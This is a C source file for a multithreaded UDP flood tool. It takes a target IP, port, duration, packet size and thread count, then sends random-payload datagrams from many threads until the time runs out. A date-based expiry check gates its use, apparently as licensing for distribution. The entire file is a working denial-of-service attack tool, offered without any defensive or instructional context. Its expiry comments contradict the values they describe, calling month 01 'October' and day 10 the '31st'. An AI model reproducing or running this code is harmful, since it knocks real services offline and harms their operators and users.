#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>

#define EXPIRATION_YEAR 2031
#define EXPIRATION_MONTH 01 // October
#define EXPIRATION_DAY 10   // 31st

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

volatile int keep_running = 1;

void handle_signal(int signal) {
    keep_running = 0;
}

void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        // Generate a random byte and store it in the payload in hexadecimal format
        payload[i] = (rand() % 256);  // Random byte between 0 and 255
    }
}

// Function to perform the UDP flooding
void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char *message;

    // Create a UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Set up server address structure
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    // Allocate message for flooding
    message = (char *)malloc(params->packet_size);
    if (message == NULL) {
        perror("Memory allocation failed");
        return NULL;
    }

    // Generate random payload
    generate_random_payload(message, params->packet_size);

    // Time-bound attack loop
    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time && keep_running) {
        sendto(sock, message, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    free(message);
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    // Get the current time
    time_t now;
    time(&now);

    // Convert to local time
    struct tm *local = localtime(&now);

    // Check if the current date is past the expiration date
    if (local->tm_year + 1900 > EXPIRATION_YEAR ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 > EXPIRATION_MONTH) ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 == EXPIRATION_MONTH && local->tm_mday > EXPIRATION_DAY)) {
        
        printf("EXPIRED\n");
        return EXIT_FAILURE;
    }

    printf("Approved\n");

    // Check for correct arguments
    if (argc != 6) {
        printf("Usage: %s <IP> <PORT> <TIME> <PACKET_SIZE> <THREAD>\n", argv[0]);
        return -1;
    }

    // Parse input arguments
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int packet_size = atoi(argv[4]);
    int thread_count = atoi(argv[5]);

    // Validate the input
    if (packet_size <= 0 || thread_count <= 0) {
        printf("Invalid packet size or thread count.\n");
        return -1;
    }

    // Setup signal handler to allow clean exit
    signal(SIGINT, handle_signal);

    // Array of thread IDs
    pthread_t threads[thread_count];
    attack_params params[thread_count];

    // Launch multiple threads for flooding
    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;

        pthread_create(&threads[i], NULL, udp_flood, &params[i]);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Flooding has been stopped after completion.\n");
    return 0;
}
